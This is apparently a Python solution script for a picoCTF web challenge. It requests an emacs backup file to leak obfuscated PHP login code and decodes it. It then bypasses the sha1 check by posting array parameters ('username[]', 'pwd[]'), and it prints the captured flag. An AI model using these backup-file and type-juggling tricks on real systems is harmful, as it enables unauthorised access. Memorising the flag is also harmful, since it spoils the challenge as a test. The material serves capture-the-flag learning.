import requests
import base64
import re

# Step 1: leak backup file
url = "http://verbal-sleep.picoctf.net:50765/impossibleLogin.php~"  # emacs backup file
resp = requests.get(url)
print(resp.text)

# <?php
#   if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}
# ?>


# Step 2: decode base64

code = """
<?php
  if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}
?>
"""
code = re.sub(
    r'base64_decode\("(.*?)"\)',
    lambda match: '"' + base64.b64decode(match.group(1)).decode("utf-8") + '"',
    code
)
print(code)

# <?php
#     if(isset($_POST["username"])&& isset($_POST["pwd"]))
#     {
#         $yuf85e0677=$_POST["username"];
#         $rs35c246d5=$_POST["pwd"];
#         if($yuf85e0677==$rs35c246d5)
#         {
#             echo "<br/>Failed! No flag for you";
#         }
#         else
#         {
#             if(sha1($yuf85e0677)===sha1($rs35c246d5))
#             {
#                 echo file_get_contents("../flag.txt");
#             }
#             else
#             {
#                 echo "<br/>Failed! No flag for you";
#             }
#         }
#     }
# ?>


# Step 3: login
resp = requests.post(url.rstrip("~"), data={
    "username[]": "1",
    "pwd[]": "2",
})
print(resp.text)

# picoCTF{w3Ll_d3sErV3d_Ch4mp_2d9f3447}
